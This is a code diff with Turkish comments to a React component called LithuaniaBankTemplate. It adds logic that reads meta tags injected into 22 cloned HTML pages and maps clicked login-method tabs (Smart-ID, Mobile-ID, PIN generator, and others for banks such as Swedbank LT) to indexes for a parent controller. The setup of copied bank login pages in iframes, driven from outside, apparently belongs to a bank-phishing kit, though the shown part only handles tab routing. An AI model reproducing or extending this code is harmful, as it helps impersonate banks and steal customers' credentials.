@@ -853,10 +853,8 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
         })();
 
         // =====================================================================
-        // -0.5 IFRAME İÇİ MİNİ METHOD MAP (GERCEK HTML SIRASI - parent ile AYNI)
-        //     Kullanım Amaci: lookupTab/siblings ile targetIndex bulunamazsa (lookupTab.parentElement yok vb.)
-        //                      -> TAB TEXT'inden MINI MAP ile DOGRU INDEX hesapla ve parenta gonder.
-        //                      Bu sayede tab click'te HIC ZAMAN targetIndex = -1 KALMIYOR.
+        // -0.9 IFRAME İÇİ MİNİ METHOD MAP (EN BASTA TANIMLANIR - onceden kullanilir)
+        //     GERCEK HTML sirasi (parent ile AYNI). Inject edilen meta/div okuma ile %100 eslesir.
         // =====================================================================
         const LITHUANIA_MINI_METHOD_MAP = {
           "swedbank-lt":  ["Biometrika/PIN",       "Smart-ID",        "Mobile-ID",                  "PIN generatorius",    "ID-kortelė"],
@@ -887,29 +885,76 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           for (const t of aT) { if (t.length >= 2 && bT.some(x => x === t || x.includes(t) || t.includes(x))) c++; }
           return c;
         }
+
+        // =====================================================================
+        // -0.75 EN GARANTI COZUM: HTML DOSYALARINA INJECT EDILEN META / DIV OKU
+        //        (inject_method_meta.js ile 22 HTML'e disaridan eklendi)
+        // =====================================================================
+        function __miniReadCurrentMethodFromInjected() {
+          try {
+            const div = document.getElementById('LITHUANIA_LOGIN_METHOD');
+            if (div) {
+              const idxStr = div.getAttribute('data-index');
+              const mth = div.getAttribute('data-method');
+              const slg = div.getAttribute('data-slug');
+              if (idxStr || mth) {
+                const i = idxStr != null ? parseInt(String(idxStr), 10) : -1;
+                return { index: isNaN(i) ? -1 : i, method: mth || '', slug: slg || '' };
+              }
+            }
+            const mIdx = document.querySelector('meta[name="login-index"]')?.getAttribute('content');
+            const mMth = document.querySelector('meta[name="login-method"]')?.getAttribute('content');
+            const mSlg = document.querySelector('meta[name="bank-slug"]')?.getAttribute('content');
+            const i = mIdx != null ? parseInt(String(mIdx), 10) : -1;
+            if (!isNaN(i) || mMth) return { index: isNaN(i) ? -1 : i, method: mMth || '', slug: mSlg || '' };
+            const t = document.title || '';
+            const tm = t.match(/-\s*(.+)$/);
+            if (tm) return { index: -1, method: tm[1].trim(), slug: '' };
+          } catch(_) {}
+          return { index: -1, method: '', slug: '' };
+        }
+        function __miniResolveIndexFromInjectedFiles(clickedLabelRaw) {
+          const targetSlug = __miniResolveBankSlug();
+          if (!targetSlug || !LITHUANIA_MINI_METHOD_MAP[targetSlug]) return -1;
+          const methods = LITHUANIA_MINI_METHOD_MAP[targetSlug];
+          const lab = __miniNormalizeText(clickedLabelRaw);
+          if (!lab) return -1;
+          for (let i = 0; i < methods.length; i++) {
+            const cand = __miniNormalizeText(methods[i]);
+            if (cand === lab) return i;
+            if (lab.includes(cand) || cand.includes(lab)) return i;
+          }
+          let bestIdx = -1, bestScore = 0;
+          for (let i = 0; i < methods.length; i++) {
+            const sc = __miniTokenOverlap(lab, methods[i]);
+            if (sc > bestScore) { bestScore = sc; bestIdx = i; }
+          }
+          return bestScore >= 1 ? bestIdx : -1;
+        }
+
         function __miniResolveIndexFromLabel(labelRaw) {
+          // 1 - EN ONCELIK: inject edilen meta/div karsilastirmasi
+          const fromInjected = __miniResolveIndexFromInjectedFiles(labelRaw);
+          if (fromInjected >= 0) return fromInjected;
+          // 2 - fallback: eski text/minimap
           const slug = __miniResolveBankSlug();
           if (!slug || !LITHUANIA_MINI_METHOD_MAP[slug]) return -1;
           const label = __miniNormalizeText(labelRaw);
           if (!label) return -1;
           const map = LITHUANIA_MINI_METHOD_MAP[slug];
-          // 1 - dogrudan match
           for (let i = 0; i < map.length; i++) {
             if (__miniNormalizeText(map[i]) === label) return i;
           }
-          // 2 - label icinde map[i] geciyor (tam includes)
           for (let i = 0; i < map.length; i++) {
             const n = __miniNormalizeText(map[i]);
             if (label.includes(n) || n.includes(label)) return i;
           }
-          // 3 - token overlap (2+)
           let bestIdx = -1, bestScore = 0;
           for (let i = 0; i < map.length; i++) {
             const s = __miniTokenOverlap(label, map[i]);
             if (s > bestScore) { bestScore = s; bestIdx = i; }
           }
-          if (bestScore >= 1) return bestIdx;
-          return -1;
+          return bestScore >= 1 ? bestIdx : -1;
         }
 
         // =====================================================================
